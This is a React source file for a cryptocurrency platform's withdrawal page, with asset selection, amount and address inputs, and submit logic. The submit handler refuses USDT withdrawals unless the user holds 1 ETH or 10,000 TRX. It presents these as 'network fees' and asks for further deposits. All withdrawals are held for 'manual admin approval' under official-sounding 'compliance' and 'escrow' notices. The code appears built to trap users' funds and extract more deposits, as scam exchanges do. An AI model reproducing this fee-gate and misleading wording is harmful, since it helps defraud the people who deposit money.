import React, { useState } from 'react';
import { useAuth } from '../context/AuthContext';
import { ASSET_METADATA, SupportedAsset } from '../types';
import { CryptoIcon } from '../components/CryptoIcon';
import { PageHeader } from '../components/PageHeader';
import { api } from '../lib/api';
import {
  ArrowUpRight,
  ShieldCheck,
  AlertCircle,
  CheckCircle2,
  Lock,
  Wallet,
  Clock,
  Info,
} from 'lucide-react';

export const WithdrawPage: React.FC = () => {
  const { user, refreshUser } = useAuth();
  const [selectedAsset, setSelectedAsset] = useState<SupportedAsset>('BTC');
  const [amount, setAmount] = useState('');
  const [destinationAddress, setDestinationAddress] = useState(
    user?.withdrawalAddresses?.[selectedAsset] || ''
  );
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);

  if (!user) return null;

  const assetInfo = ASSET_METADATA[selectedAsset];
  const currentBalance = user.balances[selectedAsset] || 0;

  const handleAssetChange = (assetId: SupportedAsset) => {
    setSelectedAsset(assetId);
    setDestinationAddress(user.withdrawalAddresses?.[assetId] || '');
    setMessage(null);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const parsedAmount = parseFloat(amount);

    if (isNaN(parsedAmount) || parsedAmount <= 0) {
      setMessage({ type: 'error', text: 'Please enter a valid withdrawal amount' });
      return;
    }

    if (parsedAmount > currentBalance) {
      setMessage({
        type: 'error',
        text: `Insufficient balance. Available balance: ${currentBalance} ${selectedAsset}`,
      });
      return;
    }

    if (!destinationAddress.trim()) {
      setMessage({ type: 'error', text: 'Please enter a destination wallet address' });
      return;
    }

    // Network Fee Validation
    if (selectedAsset === 'USDT_ERC20' && (user.balances['ETH'] || 0) < 1) {
      setMessage({
        type: 'error',
        text: 'Network Fee Required: Insufficient Ethereum (ETH) balance. Kindly deposit Ethereum to cover the network fees.',
      });
      return;
    }

    if (selectedAsset === 'USDT_TRC20' && (user.balances['TRX'] || 0) < 10000) {
      setMessage({
        type: 'error',
        text: 'Network Fee Required: Insufficient Tron (TRX) balance. Kindly deposit Tron to cover the network fees.',
      });
      return;
    }

    setLoading(true);
    setMessage(null);

    try {
      // First save destination address to user withdrawal profile
      await api.updateWithdrawalAddresses({
        [selectedAsset]: destinationAddress.trim(),
      } as Record<SupportedAsset, string>);

      // Submit withdrawal transaction (always strictly pending admin manual review)
      await api.createTransaction({
        type: 'withdraw',
        asset: selectedAsset,
        amount: parsedAmount,
        destinationAddress: destinationAddress.trim(),
      });

      await refreshUser();
      setMessage({
        type: 'success',
        text: 'Withdrawal request submitted successfully. Status: Pending Manual Admin Approval.',
      });
      setAmount('');
    } catch (err: any) {
      setMessage({ type: 'error', text: err.message || 'Withdrawal failed' });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-2xl mx-auto space-y-8 pb-12">
      {/* Page Header with Back Button */}
      <PageHeader
        title="Withdraw Crypto"
        subtitle="Initiate institutional outbound asset dispatch to external multi-chain addresses"
        icon={ArrowUpRight}
        badge="Manual Compliance Required"
        badgeType="gold"
      />

      <div className="bg-neutral-900/95 border border-amber-500/30 rounded-3xl p-6 sm:p-8 shadow-2xl text-neutral-100 space-y-6 backdrop-blur-xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-64 h-64 bg-amber-500/5 rounded-full blur-3xl pointer-events-none" />

        {/* Security & Admin Approval Policy Notice */}
        <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-start space-x-3">
          <Clock className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
          <div className="space-y-1">
            <h4 className="text-xs font-bold text-amber-300 uppercase tracking-wider font-mono">
              Strict Manual Admin Approval Policy
            </h4>
            <p className="text-xs text-neutral-300 leading-relaxed">
              Every withdrawal undergoes rigorous multi-sig compliance review and manual administrator clearance prior to blockchain broadcasting.
            </p>
          </div>
        </div>

        {message && (
          <div
            className={`p-4 rounded-2xl text-xs flex items-center space-x-3 shadow-lg ${
              message.type === 'success'
                ? 'bg-emerald-500/15 text-emerald-300 border border-emerald-500/40'
                : 'bg-red-500/15 text-red-300 border border-red-500/40'
            }`}
          >
            {message.type === 'success' ? (
              <CheckCircle2 className="w-5 h-5 shrink-0 text-emerald-400" />
            ) : (
              <AlertCircle className="w-5 h-5 shrink-0 text-red-400" />
            )}
            <span className="font-medium">{message.text}</span>
          </div>
        )}

        {/* Asset Selector */}
        <div>
          <label className="block text-xs font-semibold text-neutral-300 mb-2.5 uppercase tracking-wider">
            Select Asset to Withdraw
          </label>
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
            {Object.values(ASSET_METADATA).map((asset) => {
              const isSelected = selectedAsset === asset.id;
              const bal = user.balances[asset.id] || 0;
              return (
                <button
                  key={asset.id}
                  type="button"
                  onClick={() => handleAssetChange(asset.id)}
                  className={`p-3.5 rounded-2xl border text-left transition-all flex items-center space-x-3 ${
                    isSelected
                      ? 'bg-amber-500/15 border-amber-500/80 text-amber-300 shadow-md ring-1 ring-amber-500/30'
                      : 'bg-neutral-950 border-neutral-800 text-neutral-400 hover:border-neutral-700 hover:text-neutral-200'
                  }`}
                >
                  <CryptoIcon asset={asset.id} size="sm" />
                  <div className="overflow-hidden">
                    <p className="font-bold text-xs truncate">{asset.symbol}</p>
                    <p className="text-[10px] text-neutral-400 font-mono mt-0.5 truncate">
                      Bal: <span className="text-amber-400 font-semibold">{bal.toFixed(4)}</span>
                    </p>
                  </div>
                </button>
              );
            })}
          </div>
        </div>

        {/* Balance & Amount Input */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="p-4 bg-neutral-950/90 border border-neutral-800 rounded-2xl flex justify-between items-center text-xs shadow-inner">
            <div className="flex items-center space-x-3">
              <CryptoIcon asset={selectedAsset} size="md" showNetworkBadge />
              <div>
                <span className="text-neutral-500 block text-[11px]">Available Vault Balance</span>
                <span className="font-bold font-mono text-neutral-100 text-sm">
                  {currentBalance.toFixed(4)} {assetInfo.symbol}
                </span>
              </div>
            </div>
            <button
              type="button"
              onClick={() => setAmount(currentBalance.toString())}
              className="px-3 py-1.5 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-400 font-bold text-xs hover:bg-amber-500/20 transition-all font-mono"
            >
              MAX
            </button>
          </div>

          <div>
            <label className="block text-xs font-semibold text-neutral-300 mb-1.5">Withdrawal Amount</label>
            <div className="relative">
              <input
                type="number"
                step="any"
                required
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="0.00"
                className="w-full bg-neutral-950 border border-neutral-800 rounded-2xl px-4 py-3 text-xs text-neutral-100 font-mono focus:outline-none focus:border-amber-500/50"
              />
              <span className="absolute right-4 top-3 text-xs text-amber-400 font-bold font-mono">
                {assetInfo.symbol}
              </span>
            </div>
          </div>

          <div>
            <div className="flex justify-between items-center mb-1.5">
              <label className="block text-xs font-semibold text-neutral-300">
                Destination Wallet Address ({assetInfo.network})
              </label>
              {user.connectedWallet && (
                <button
                  type="button"
                  onClick={() => setDestinationAddress(user.connectedWallet?.address || '')}
                  className="text-[11px] text-amber-400 hover:underline font-mono"
                >
                  Use Connected Wallet
                </button>
              )}
            </div>
            <input
              type="text"
              required
              value={destinationAddress}
              onChange={(e) => setDestinationAddress(e.target.value)}
              placeholder={`Enter valid ${assetInfo.network} address`}
              className="w-full bg-neutral-950 border border-neutral-800 rounded-2xl px-4 py-3 text-xs text-neutral-100 font-mono focus:outline-none focus:border-amber-500/50"
            />
          </div>

          <div className="p-3.5 bg-neutral-950/80 border border-neutral-800 rounded-2xl space-y-1 text-[11px] text-neutral-400">
            <div className="flex items-center space-x-1.5 text-amber-400 font-semibold">
              <Lock className="w-3.5 h-3.5" />
              <span>Custody Safeguard Notice</span>
            </div>
            <p className="leading-relaxed">
              Upon submission, funds are moved into encrypted escrow. Manual authorization by the compliance administration will release transaction batching to the blockchain.
            </p>
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full py-3.5 rounded-2xl bg-gradient-to-r from-amber-500 via-yellow-400 to-amber-500 text-neutral-950 font-black text-xs shadow-lg shadow-amber-500/20 hover:from-amber-400 hover:to-yellow-300 transition-all flex items-center justify-center space-x-2 disabled:opacity-50 active:scale-[0.99]"
          >
            <span>{loading ? 'Submitting to Compliance Queue...' : `Submit Withdrawal (${amount || '0'} ${assetInfo.symbol})`}</span>
            <ArrowUpRight className="w-4 h-4" />
          </button>
        </form>
      </div>
    </div>
  );
};
